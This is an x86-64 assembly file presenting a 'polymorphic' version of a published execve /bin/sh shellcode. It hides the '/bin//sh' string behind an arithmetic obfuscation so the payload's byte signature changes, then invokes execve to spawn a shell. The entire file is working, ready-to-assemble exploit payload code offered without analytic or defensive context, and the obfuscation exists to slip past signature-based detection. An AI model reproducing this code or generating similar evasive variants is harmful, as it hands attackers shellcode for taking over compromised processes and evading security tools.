; Polymorphic shellcode version of http://shell-storm.org/shellcode/files/shellcode-76.php
; Original size: 33 bytes
; Polymorphic size: 31 bytes


global _start
section .text
_start:
    
    xor rax, rax ; clear out rax 
    cdq          ; clear out rdx
    push rax
    pop rsi

    mov rbx, 0x68732f2f5b31eefe ; Some string obfuscation
    add rbx, 0x13377331

    push rax
    push rbx  

    push rsp
    pop rdi ; rdi points to /bin/sh

    mov al, 0x3b
    syscall

